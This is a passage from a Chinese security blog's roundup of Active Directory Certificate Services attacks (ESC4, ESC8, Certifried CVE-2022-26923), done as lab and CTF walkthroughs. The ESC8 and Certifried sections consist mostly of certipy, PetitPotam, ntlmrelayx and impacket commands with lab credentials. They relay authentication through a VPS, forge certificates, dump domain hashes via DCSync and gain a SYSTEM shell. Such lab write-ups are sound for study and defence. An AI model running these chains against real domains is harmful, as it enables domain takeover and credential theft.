+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -ca sequel-DC-CA -dc-ip 10.10.11.202 -target 10.10.11.202 -template ESC4 -upn administrator@SEQUEL.HTB</span><br></pre></td></tr></table></figure>
+<p>使用ESC1的攻击手法获取管理员证书</p>
+<p><img src="/images/content/Snipaste_2023-12-25_13-39-19.png" alt="Alt text"></p>
+<p>出现<code>KDC_ERR_PADATA_TYPE_NOSUPP</code>使用passthecert.py解决</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certipy cert -pfx administrator.pfx -nokey -out user.crt</span><br><span class="line">certipy cert -pfx administrator.pfx -nocert -out user.key</span><br><span class="line"></span><br><span class="line">impacket-passthecert -action add_computer -crt user.crt -key user.key -domain sequel.htb -dc-ip 10.10.11.202</span><br><span class="line"></span><br><span class="line">impacket-passthecert -action modify_user -crt user.crt -key user.key -domain sequel.htb -dc-ip 10.10.11.202 -target <span class="string">&#x27;DESKTOP-QANJBC9M$&#x27;</span> -elevate</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-25_13-40-46.png" alt="Alt text"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;DESKTOP-FQJQFXBP$&#x27;</span>:<span class="string">&#x27;MoQyhKP2XxW6cjoy6tnzmkxHvKuPZ946&#x27;</span>@10.10.11.202</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-25_13-41-05.png" alt="Alt text"></p>
+<p>恢复原来的证书配置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy template -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -dc-ip 10.10.11.202 -target 10.10.11.202 -template ESC4 -configuration ESC4.json</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-25_13-45-54.png" alt="Alt text"></p>
+<h2 id="ESC8"><a href="#ESC8" class="headerlink" title="ESC8"></a>ESC8</h2><p>测试机器：春秋云境 2022网鼎杯半决赛复盘</p>
+<p>前提条件：域内安装CA证书服务，域内用户权限</p>
+<p>2022网鼎杯半决赛内网环境如图下所示，18为CA服务器，13为DC服务器，35为域内机器，26为入口点机器隧道搭建在这台机器上，24和26都属于域外机器。</p>
+<p><img src="/images/content/Snipaste_2023-12-28_17-20-01.png" alt="Alt text"></p>
+<p>枚举证书模板漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#注意使用代理时要加上-dns-tcp使流量走tcp协议，不然漏洞会扫不出来，因为代理走的tcp协议</span></span><br><span class="line">proxychains -q certipy find -u <span class="string">&#x27;huachunmei&#x27;</span> -p <span class="string">&#x27;1qaz2wsx&#x27;</span> -dc-ip 172.22.15.13 -target 172.22.15.13 -vulnerable -dns-tcp -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-26_16-47-44.png" alt="Alt text"></p>
+<p>ESC8的利用需要用到<code>ntlmrelayx</code>工具监听smb请求数据，服务器环境不支持，所以需要本地启动，因为收到请求后还要重放数据到CA服务器上，就要利用端口转发和socks代理，所以在入口点使用frp搭建socks代理。而<code>PetitPotam.py</code>的强制认证又需要445端口，因为入口点机器获取不到root权限，所以445端口无法开启监听就需要从26这台机器上将445端口转到入口点大于1024的端口上，之后将端口转发到vps上，在vps使用<code>ntlmrelayx</code>开启smb监听</p>
+<p>在入口点机器上搭建frp socks5代理，并且将本地9999端口转发到vps的9999端口上</p>
+<p><img src="/images/content/Snipaste_2023-12-29_10-04-30.png" alt="Alt text"></p>
+<p><img src="/images/content/Snipaste_2023-12-29_10-03-32.png" alt="Alt text"></p>
+<p>用17010打下24这台机器后关闭smb服务，将445端口的流量转发到入口点机器的9999端口上并重启。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc config lanmanserver start= <span class="string">&quot;disabled&quot;</span></span><br><span class="line">netsh interface portproxy add v4tov4 listenport=445 connectaddress=172.22.15.26 connectport=9999</span><br><span class="line">shutdown /r /t 0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-29_10-06-41.png" alt="Alt text"></p>
+<p>使用24这台机器强制认证时流量其实是到vps的9999端口上</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q python3 PetitPotam.py -d xiaorang.lab -u huachunmei -p 1qaz2wsx 172.22.15.24 172.22.15.13</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-28_13-16-55.png" alt="Alt text"></p>
+<p>在vps上使用代理来启动<code>ntlmrelayx</code>，9999端口本身不需要代理，但是relay时需要代理请求CA服务器的<code>http://172.22.15.18/certsrv/certfnsh.asp</code>所以需要使用<code>proxychains</code>开启代理，而conf中代理IP改成<code>127.0.0.1</code>即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q ntlmrelayx.py -t http://172.22.15.18/certsrv/certfnsh.asp -smb2support --adcs --template DomainController --no-http-server --no-wcf-server --no-raw-server --smb-port 9999</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-28_13-17-36.png" alt="Alt text"></p>
+<p>将获得的base64证书解码后添加机器用户进行RBCD获取管理员证书</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q impacket-passthecert -action add_computer -crt user.crt -key user.key -domain xiaorang.lab -dc-ip 172.22.15.13</span><br><span class="line"></span><br><span class="line">proxychains -q impacket-getST <span class="string">&#x27;xiaorang.lab/DESKTOP-3K1C61M5$:e0tbANRzEHgZQkozsX2KQL5U92pZWPMo&#x27;</span> -dc-ip 172.22.15.13 -impersonate administrator -spn cifs/xr-dc01.xiaorang.lab</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line"></span><br><span class="line">proxychains -q impacket-psexec administrator@xr-dc01.xiaorang.lab -target-ip 172.22.15.13 -k -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-28_13-19-49.png" alt="Alt text"></p>
+<p><img src="/images/content/Snipaste_2023-12-28_13-20-26.png" alt="Alt text"></p>
+<p><img src="/images/content/Snipaste_2023-12-28_13-20-51.png" alt="Alt text"></p>
+<h2 id="Certifried（CVE-2022-26923）"><a href="#Certifried（CVE-2022-26923）" class="headerlink" title="Certifried（CVE-2022-26923）"></a>Certifried（CVE-2022-26923）</h2><p>测试机器：TryHackMe CVE-2022-26923</p>
+<p>前提条件：域内安装CA证书服务，域内用户权限</p>
+<p>首先枚举漏洞，会发现这台机器有ESC1漏洞，但本次实验不使用这个漏洞，只需要记下<code>CA Name</code>和<code>DNS Name</code>即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;ryan.cooper&#x27;</span> -p <span class="string">&#x27;NuclearMosquito3&#x27;</span> -dc-ip 10.10.11.202 -target 10.10.11.202 -vulnerable -stdout</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-26_10-38-07.png" alt="Alt text"></p>
+<p>添加机器账号，并且将它的DNS改成域控的<code>DNS Name</code>，之后申请的机器证书就为域控机器用户的证书。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certipy account create -user <span class="string">&#x27;dandeny1$&#x27;</span> -pass <span class="string">&#x27;P@ssw0rd&#x27;</span> -dns <span class="string">&#x27;LUNDC.lunar.eruca.com&#x27;</span> -target 10.10.152.173 -dc-ip 10.10.152.173 -u thm -p <span class="string">&#x27;Password1@&#x27;</span></span><br><span class="line"></span><br><span class="line">certipy req -u <span class="string">&#x27;dandeny1$&#x27;</span> -p <span class="string">&#x27;P@ssw0rd&#x27;</span> -ca <span class="string">&#x27;lunar-lundc-ca&#x27;</span> -target 10.10.152.173 -dc-ip 10.10.152.173 -template <span class="string">&#x27;Machine&#x27;</span> -debug</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-26_10-41-51.png" alt="Alt text"></p>
+<p>如果没有修改DNS则申请的机器证书就只是当前机器用户的证书，获取不到DCSync权限</p>
+<p><img src="/images/content/Snipaste_2023-12-26_10-52-33.png" alt="Alt text"></p>
+<p>获取域控机器用户hash，进行DCSync</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secreatdump <span class="string">&#x27;lundc$@lunar.eruca.com&#x27;</span>@10.10.152.173 -hasees <span class="string">&#x27;:14fc9b5814def64289bb694f6659c733&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/content/Snipaste_2023-12-26_10-50-44.png" alt="Alt text"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">dandeny</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/12/29/ADCS%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">http://example.com/2023/12/29/ADCS%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">dandeny's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/bg/3wkO7fuQpgda6vz.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/12/12/%E8%AE%B0%E4%B8%80%E6%AC%A1aspx%20webshell%E7%BB%95%E8%BF%87%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/" title="记一次aspx webshell绕过主动防御"><img class="cover" src="/images/bg/lP3rLNUBaGtSVzc.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">记一次aspx webshell绕过主动防御</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/images/bg/941d9457d1adf41dd8022e5edbc284a1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dandeny</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/sdandeny"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC7"><span class="toc-number">1.</span> <span class="toc-text">ESC7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KRB-AP-ERR-SKEW"><span class="toc-number">1.1.</span> <span class="toc-text">KRB_AP_ERR_SKEW</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC1"><span class="toc-number">2.</span> <span class="toc-text">ESC1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#KDC-ERR-PADATA-TYPE-NOSUPP"><span class="toc-number">2.1.</span> <span class="toc-text">KDC_ERR_PADATA_TYPE_NOSUPP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC2-ESC3"><span class="toc-number">3.</span> <span class="toc-text">ESC2 ESC3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC3"><span class="toc-number">3.1.</span> <span class="toc-text">ESC3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESC2"><span class="toc-number">3.2.</span> <span class="toc-text">ESC2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC4"><span class="toc-number">4.</span> <span class="toc-text">ESC4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ESC8"><span class="toc-number">5.</span> <span class="toc-text">ESC8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Certifried%EF%BC%88CVE-2022-26923%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">Certifried（CVE-2022-26923）</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/29/ADCS%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="ADCS漏洞汇总"><img src="/images/bg/3wkO7fuQpgda6vz.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ADCS漏洞汇总"/></a><div class="content"><a class="title" href="/2023/12/29/ADCS%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/" title="ADCS漏洞汇总">ADCS漏洞汇总</a><time datetime="2023-12-29T07:55:53.000Z" title="发表于 2023-12-29 15:55:53">2023-12-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/12/%E8%AE%B0%E4%B8%80%E6%AC%A1aspx%20webshell%E7%BB%95%E8%BF%87%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/" title="记一次aspx webshell绕过主动防御"><img src="/images/bg/lP3rLNUBaGtSVzc.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次aspx webshell绕过主动防御"/></a><div class="content"><a class="title" href="/2023/12/12/%E8%AE%B0%E4%B8%80%E6%AC%A1aspx%20webshell%E7%BB%95%E8%BF%87%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1/" title="记一次aspx webshell绕过主动防御">记一次aspx webshell绕过主动防御</a><time datetime="2023-12-12T08:35:23.000Z" title="发表于 2023-12-12 16:35:23">2023-12-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/28/%E8%87%AA%E7%94%A8%E5%85%8D%E6%9D%80%E9%A9%AC%E8%AE%B0%E5%BD%95/" title="自用免杀马记录"><img src="/images/bg/gcnavZbmepS8d4u.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="自用免杀马记录"/></a><div class="content"><a class="title" href="/2023/11/28/%E8%87%AA%E7%94%A8%E5%85%8D%E6%9D%80%E9%A9%AC%E8%AE%B0%E5%BD%95/" title="自用免杀马记录">自用免杀马记录</a><time datetime="2023-11-28T09:23:12.000Z" title="发表于 2023-11-28 17:23:12">2023-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/14/%E6%9F%90%E7%A7%91%E6%8A%80%E8%82%A1%E4%BB%BD%E5%85%AC%E5%8F%B8HW%E5%B0%8F%E7%BB%93/" title="某科技股份公司HW小结"><img src="/images/bg/bEJsXxewpOGuRD8.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="某科技股份公司HW小结"/></a><div class="content"><a class="title" href="/2023/11/14/%E6%9F%90%E7%A7%91%E6%8A%80%E8%82%A1%E4%BB%BD%E5%85%AC%E5%8F%B8HW%E5%B0%8F%E7%BB%93/" title="某科技股份公司HW小结">某科技股份公司HW小结</a><time datetime="2023-11-14T02:33:45.000Z" title="发表于 2023-11-14 10:33:45">2023-11-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/13/%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/" title="一些绕过防护的打点记录"><img src="/images/bg/53eTB2uiNRlXwFP.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="一些绕过防护的打点记录"/></a><div class="content"><a class="title" href="/2023/11/13/%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9A%84%E6%89%93%E7%82%B9%E8%AE%B0%E5%BD%95/" title="一些绕过防护的打点记录">一些绕过防护的打点记录</a><time datetime="2023-11-13T14:03:15.000Z" title="发表于 2023-11-13 22:03:15">2023-11-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/images/bg/3wkO7fuQpgda6vz.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By dandeny</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
